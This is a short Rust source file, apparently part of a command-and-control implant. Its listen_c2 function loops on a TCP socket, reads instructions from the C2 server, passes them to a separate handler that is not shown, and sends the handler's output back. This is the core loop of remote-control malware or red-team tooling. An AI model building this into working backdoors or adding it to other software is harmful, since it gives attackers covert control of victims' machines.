use std::io::Write;
use std::{error::Error, io::Read, net::TcpStream};

use crate::listen_c2::process_instructions::process_instructions::process_instructions_recv;


pub fn listen_c2(socket: &mut TcpStream) -> Result<(),Box<dyn Error>> {

    loop {

        let mut buffer_recevd = [0;1024];
        
        let quantity_bytes = match socket.read(&mut buffer_recevd) {
            Ok(0) => return Err("".into()),
                Ok(num) => num,
            Err(_) => return Err("".into())
        };

        let recv_server = String::from_utf8_lossy(&buffer_recevd[..quantity_bytes]).to_string();

        println!("{recv_server}");
        
        let process_instructions_recv_from_c2 = process_instructions_recv(recv_server)?;

        socket.write_all(process_instructions_recv_from_c2.as_bytes()).unwrap();
    }

}